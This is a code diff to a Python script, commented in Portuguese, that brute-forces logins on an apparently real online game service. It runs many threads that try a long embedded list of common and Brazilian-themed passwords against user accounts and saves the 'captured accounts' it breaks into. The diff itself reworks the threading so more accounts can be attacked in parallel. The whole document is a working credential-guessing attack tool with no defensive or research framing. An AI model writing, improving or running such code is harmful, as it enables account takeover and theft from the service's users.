@@ -57,6 +57,7 @@ def tentar_login(usuario, senha, senhas_usadas, lock):
                 contas_capturadas.append(conta)
             print(f"Conta logada: {usuario} com senha {senha}")
             salvar_contas(contas_capturadas, lock)
+            contas_em_execucao.remove(usuario)
             return True
         else:
             print(f"Erro no login {usuario}: {resposta}")
@@ -84,6 +85,9 @@ def gerar_senhas(usuario):
     ]
     return senhas
 
+contas_capturadas = []
+contas_em_execucao = []
+
 def tentar_varios_logins(usuario, senhas_comuns, lock):
     senhas_usadas = set()
 
@@ -92,13 +96,11 @@ def tentar_varios_logins(usuario, senhas_comuns, lock):
         if tentar_login(usuario, senha, senhas_usadas, lock):
             return
 
-    for senha in senhas_comuns:
-        if tentar_login(usuario, senha, senhas_usadas, lock):
+    for senha_comum in senhas_comuns:
+        if tentar_login(usuario, senha_comum, senhas_usadas, lock):
             return
 
-def processar_logins(logins, senhas_comuns, lock):
-    for usuario in logins:
-        tentar_varios_logins(usuario, senhas_comuns, lock)
+    print(f"Todos os métodos de login para {usuario} foram tentados.")
 
 if __name__ == "__main__":
     senhas_comuns = ["01234", "012345", "1234567890", "gartic1234", "gartic12345", "000", "00000", "gartic123456", "0123", "321", "4321", "987654321", "admin", "senha123", "102030", "dragon", "baseball", "abcdef", "football", "monkey", "letmein", "696969", "010101", "222222" "666666", "999999", "michael", "pussy", "Brasil", "brasil", "10203040", "master", "smart2020", "guest", "col123456", "mestre", "password123", "world123", "mundo123", "flamengo", "gremio", "123mudar", "felipe", "101010", "convidado", "121212", "estrela", "felicidade", "sucesso", "tristeza", "131313", "lucas123", "amor", "deus", "doce", "meusite", "minhasenha", "flor", "eu123", "meulindo", "gatinha", "batatinha", "euamovoce", "feliz", "mariana", "juliana", "camila", "maria", "amigo", "lindo", "amor123", "123amor", "teamo", "meuamor", "deus123", "gatinho", "florzinha", "cachorro", "gato1", "feliz123", "jesus", "minhavida", "123deus", "jesus123", "meufilho", "mundo", "gatinha123", "123meu", "123linda", "alegria", "gartic", "abc123", "qwerty", "senha", "amorinha", "fofinha", "meusonho", "gatona", "vencedor", "lucas456", "vidanova", "brasileiro", "teusol", "brilhante", "sorriso", "minhamor", "123beleza", "flor123", "gatinhos2", "amigos123", "123futuro", "minhaestrela", "saudades", "minhaluz", "gatinho2", "mudar123", "lindinha", "meus123", "gatona123", "mestre2020", "feliz2020", "qwert123", "estrela123", "gratidão", "amor1234", "gatita", "123321", "mundo1234", "senha2022", "felipe123", "101112", "112233", "star2022", "cachorra123", "senhaforte", "minhasenha", "abc123", "123abc", "cachorrinho", "meulindo123", "batatinha12", "brasil123", "010203", "10203040", "666", "vasco", "palmeiras", "corinthians", "botafogo", "saopaulo", "fluminense", "cruzeiro", "sport", "internacional", "fortaleza", "bahia", "saopaulo", "futebol", "riodejaneiro","barcelona", "madrid", "cr7", "messi", "neymar", "1985", "1986", "1987", "1988", "1989", "1990", "1991", "1992", "1993", "1994", "1995", "1996", "1997", "1998", "1999", "2000", "2001", "2002", "2003", "2004", "2005", "2006", "2007", "2008", "2009", "2010", "2011", "2012", "2013", "2014", "2015", "2016", "2017", "2018", "2019", "2020", "2021", "2022", "2023", "2024",  "maria", "joao", "ana", "pedro", "laura", "carlos", "juliana", "rafael", "fernanda", "gustavo", "tatiane", "felipe", "camila", "andre", "natalia", "thiago", "bianca", "roberto", "isabela", "marcos", "priscila", "daniel", "aline", "bruno", "jessica", "vinícius", "mariana", "diego", "evelyn", "eduardo", "sofia", "matheus", "larissa", "leandro", "julio", "clara", "fabio", "erica", "alexandre", "renata","maria","spring", "summer", "autumn", "winter", "dragon","1q2w3e4r","sunshine","654321","master","1234","football","1234567890","000000","computer","666666","superman","michael","internet","iloveyou","daniel","1qaz2wsx","monkey","shadow","jessica","letmein","baseball","whatever","princess","abcd1234","123321","starwars","121212","thomas","zxcvbnm","trustno1","killer","welcome","jordan","aaaaaa","123qwe","freedom","password1","charlie","batman","jennifer","7777777","michelle","diamond","oliver","mercedes","benjamin","11111111","snoopy","samantha","victoria","matrix","george","alexander","secret","cookie","asdfgh","987654321","123abc","orange","fuckyou","asdf1234","pepper","hunter","silver","joshua","banana","1q2w3e","chelsea","1234qwer","summer","qwertyuiop","phoenix","andrew","q1w2e3r4","elephant","rainbow","mustang","merlin","london","garfield","robert","chocolate","112233","samsung","qazwsx","matthew","buster","jonathan","ginger","flower","555555","test","caroline","amanda","maverick","midnight","martin","junior","88888888","anthony","jasmine","creative","patrick","mickey","123","qwerty123","cocacola","chicken","passw0rd","forever","william","nicole","hello","yellow","nirvana","justin","friends","cheese","tigger","mother","liverpool","blink182","asdfghjkl","andrea","spider","scooter","richard","soccer","rachel","purple","morgan","melissa","jackson","arsenal","222222","qwe123","gabriel","ferrari","jasper","danielle","bandit","angela","scorpion","prince","maggie","austin","veronica","nicholas","monster","dexter","carlos","thunder","success","hannah","ashley","131313","stella","brandon","pokemon","joseph","asdfasdf","999999","metallica","december","chester","taylor","sophie","samuel","rabbit","crystal","barney","xxxxxx","steven","ranger","patricia","christian","asshole","spiderman","sandra","hockey","angels","security","parker","heather","888888","victor","harley","333333","system","slipknot","november","jordan23","canada","tennis","qwertyui","casper","gemini","asd123","winter","hammer","cooper","america","albert","777777","winner","charles","butterfly","swordfish","popcorn","penguin","dolphin","carolina","access","987654","hardcore","corvette","apples","12341234","sabrina","remember","qwer1234","edward","dennis","cherry","sparky","natasha","arthur","vanessa","marina","leonardo","johnny","dallas","antonio","winston","snickers","olivia","nothing","iceman","destiny","coffee","apollo","696969","windows","williams","school","madison","dakota","angelina","anderson","159753","1111","yamaha","trinity","rebecca","nathan","guitar","compaq","123123123","toyota","shannon","playboy","peanut","pakistan","diablo","abcdef","maxwell","golden","asdasd","123654","murphy","monica","marlboro","kimberly","gateway","bailey","0000000","snowbal","scooby","nikita","falcon","august","test123","sebastian","panther","love","johnson","godzilla","genesis","brandy","adidas","zxcvbn","wizard","porsche","online","hello123","fuckoff","eagles","champion","bubbles","boston","smokey","precious","mercury","lauren","einstein","cricket","cameron","angel","admin","napoleon","mountain","lovely","friend","flowers","dolphins","david","chicago","sierra","knight","yankees","wilson","warrior","simple","nelson","muffin","charlotte","calvin","spencer","newyork","florida","fernando","claudia","basketball","barcelona","87654321","willow","stupid","samson","police","paradise","motorola","manager","jaguar","jackie","family","doctor","bullshit","brooklyn","tigers","stephanie","slayer","peaches","miller","heaven","elizabeth","bulldog","animal","789456","scorpio","rosebud","qwerty12","franklin","claire","american","vincent","testing","pumpkin","platinum","louise","kitten","general","united","turtle","marine","icecream","hacker","darkness","cristina","colorado","boomer","alexandra","steelers","serenity","please","montana","mitchell","marcus","lollipop","jessie","happy","cowboy","102030","marshall","jupiter","jeremy","gibson","fucker","barbara","adrian","1qazxsw2","12344321","11111","startrek","fishin","digital","christine", "business"]
@@ -115,13 +117,15 @@ if __name__ == "__main__":
 
     for i in range(0, len(logins_comuns), tamanho_lote):
         lote = logins_comuns[i:i + tamanho_lote]
-        t = threading.Thread(target=processar_logins, args=(lote, senhas_comuns, lock))
-        threads.append(t)
-
-    for t in threads:
-        t.start()
-    for t in threads:
-        t.join()
+        for usuario in lote:
+            t = threading.Thread(target=tentar_varios_logins, args=(usuario, senhas_comuns, lock))
+            threads.append(t)
+    for i in range(0, len(threads), max_threads):
+        lote = threads[i:i + max_threads]
+        for t in lote:
+            t.start()
+        for t in lote:
+            t.join()
 
     salvar_contas(contas_capturadas, lock)
 
